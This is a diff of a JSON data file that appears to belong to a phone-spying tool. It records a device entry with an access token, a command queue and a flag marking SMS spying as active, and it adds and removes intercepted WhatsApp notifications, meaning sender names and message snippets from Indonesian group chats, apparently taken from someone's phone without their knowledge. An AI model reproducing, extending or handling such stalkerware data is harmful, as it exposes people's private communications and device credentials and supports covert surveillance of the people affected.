@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777178093887,
+    "lastSeen": 1777178108870,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (23 pesan): ~ hanma back era",
+        "content": "💟 Stiker",
+        "time": "26/04 12:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178094933
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎81 pesan dari 2 chat",
+        "time": "26/04 12:45",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777178094927
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎7Sex Message (58 pesan): ~ wanglin",
@@ -4003,22 +4019,6 @@
         "time": "26/04 11:24",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173217717
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐉𝐁 𝟏  || 𝐊𝐈𝐍𝐆 𝐕𝐀𝐋𝐙  ✨ (95 pesan): ~ Hudzz Sturee",
-        "content": "📷 op?30+ gb+sl angkut sumua mc/direct bebas",
-        "time": "26/04 11:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173216955
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (39 pesan): ~ Jz12",
-        "content": "📷 YAKIN GAMAU BELI UNCHECK RAMA STORE?MUMPUNG GACOR JAMIN DPT INI YANG MAU BELI AJA😋😋",
-        "time": "26/04 11:24",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173216244
       }
     ],
     "galleryPhotos": [],
